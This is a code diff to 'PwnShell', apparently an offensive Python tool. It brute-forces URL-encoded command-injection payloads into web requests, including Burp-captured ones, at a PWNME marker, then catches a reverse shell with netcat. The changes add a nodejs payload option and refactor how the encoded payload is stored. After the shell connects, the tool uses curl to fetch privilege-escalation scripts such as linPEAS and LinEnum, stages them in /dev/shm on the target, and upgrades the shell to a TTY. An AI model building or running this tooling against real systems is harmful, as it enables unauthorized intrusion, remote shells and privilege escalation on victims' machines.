@@ -36,6 +36,7 @@ class PwnShell:
         self.url=None
         self.iteration=0
         self.listt=[]
+        self.encoded_payload=None
 
         ########################################################################
         ###################### Specifying OS ###################################
@@ -93,13 +94,16 @@ class PwnShell:
         nc = nclib.Netcat(listen=('', self.port))
         print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
         print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
-        print("[+]Vulnerable URL:",self.url)
+        if self.method == "get":
+        	print("[+]Vulnerable URL:",self.url)
+        else:
+        	print(f"[+]Payload: {self.encoded_payload}")
         print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
         print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
         print('[*]Cloning PrivESC Scripts From Their Repositories...')
         time.sleep(1)
         print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
-        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
+        os.system('curl -fs https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -fs https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -fs https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -fs https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -fs https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
         print('[*]Activating a TTY Shell Using --> [Python3]')
         time.sleep(8)
         nc.send_line(b"export TERM=xterm-256color")
@@ -149,20 +153,20 @@ class PwnShell:
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
     	if not self.file:
-    		payloads = PayLoads(self.ip, self.port).payloads()
+    		payloads = PayLoads(self.ip, self.port,self.nodejs).payloads()
     		print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
     		for payload in payloads:
-    			encoded_payload = self.get_url_encoded_payload(payload)
+    			self.encoded_payload = self.get_url_encoded_payload(payload)
     			self.iteration += 1
-    			print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {encoded_payload}',end='\r',flush=True)
+    			print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
     			time.sleep(2)  # Change this ASAP !!!
-    			self.send_request(encoded_payload)
+    			self.send_request()
 
     ###############################################################################################
     ###################################  Send The Request #########################################
-    def send_request(self,encoded_payload):
+    def send_request(self):
         if self.domain:
-        	self.url = self.domain.replace('PWNME',encoded_payload)
+        	self.url = self.domain.replace('PWNME',self.encoded_payload)
         	proxies = {'http': 'http://127.0.0.1:8080'}
         	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
         	if self.cookie:
@@ -171,7 +175,7 @@ class PwnShell:
         		cookies =None
         	if self.method == 'post' or self.method == 'POST':
         		if self.data:
-        			data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
+        			data_parsed = self.data.replace("PWNME", self.encoded_payload)  # Don't change
         		else:
         			data_parsed = None
         			r = requests.post(self.url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
@@ -182,24 +186,24 @@ class PwnShell:
     ###################################  PARSER BURPREQUEST #################################
     def parse_file(self):
     	print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
-    	payloads = PayLoads(self.ip, self.port).payloads()
+    	payloads = PayLoads(self.ip, self.port,self.nodejs).payloads()
     	for payload in payloads:
         	proxies = {'http': 'http://127.0.0.1:8080'}
-        	encoded_payload = self.get_url_encoded_payload(payload)
+        	self.encoded_payload = self.get_url_encoded_payload(payload)
         	self.iteration += 1
-        	print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {encoded_payload}',end='\r',flush=True)
+        	print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
         	request, post_data = burpee.parse_request(self.file)  # Don't change
         	for r in request:
         		if request[r] == "PWNME":
-        			request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
+        			request[r] = request[r].replace("PWNME", self.encoded_payload)  # THE PAYLOAD
         		if r == "Host":
         			self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
         	if post_data:
-        		self.url = self.url.replace("PWNME", encoded_payload)
-        		post_data = post_data.replace("PWNME", encoded_payload)
-        		req = requests.post(url, headers=request, data=post_data, verify=False)
+        		self.url = self.url.replace("PWNME", self.encoded_payload)
+        		post_data = post_data.replace("PWNME", self.encoded_payload)
+        		req = requests.post(self.url, headers=request, data=post_data, verify=False)
         	else:
-        		self.url = self.url.replace("PWNME", encoded_payload)
+        		self.url = self.url.replace("PWNME", self.encoded_payload)
         		req = requests.get(self.url, headers=request,verify=False)
         		time.sleep(2)
     ######################################################################################
@@ -213,9 +217,9 @@ class PwnShell:
 
     @staticmethod
     def get_url_encoded_payload(payload):
-        encoded_payload = urllib.parse.quote(payload)
-        encoded_payload = encoded_payload.replace('/', '%2F')
-        return encoded_payload
+    	encoded_payload = urllib.parse.quote(payload)
+    	encoded_payload = encoded_payload.replace('/', '%2F')
+    	return encoded_payload
 
 
 def exit_gracefully():
